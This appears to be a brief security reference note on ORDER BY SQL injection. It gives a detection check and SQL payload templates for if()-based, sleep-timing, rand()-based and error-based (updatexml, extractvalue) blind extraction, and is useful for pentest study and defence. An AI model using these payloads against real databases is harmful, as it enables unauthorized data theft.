# Order by injection

Order by injection is an SQL injection with an injection point after `order by`.

Usually, the digital injection is exploited and the statement is as following.

```sql
select * from user order by $id;
```

## Injection judgment

use `order by asc` and `order by desc` separately. If there exists vulnerability, the results are different.

## Blind injection based on if()

Add an `if()` statement after `order by`. Whether the expression in `if()` is true or not will affect the sorting result. Based on `if()`, we can realize all kinds of blind injection.

```sql
select * from user order by if(expression, id, name);
select * from user order by if(expression, 1,(select id from information_schema.tables));
select * from user order by if(expression, 1, sleep(1));
```

## Blind injection based on rand()

Add an `rand()` expression after `order by`, and whether the expression in `if()` is true or not will affect the sorting result.

```sql
select * from user order by rand(expression);
```

## Blind injection based on error

```sql
select * from user order by updatexml(1,concat(0x7e,(expression),0x7e),1);
select * from user order by extractvalue(1, concat(0x7e,(expression),0x7e));
```
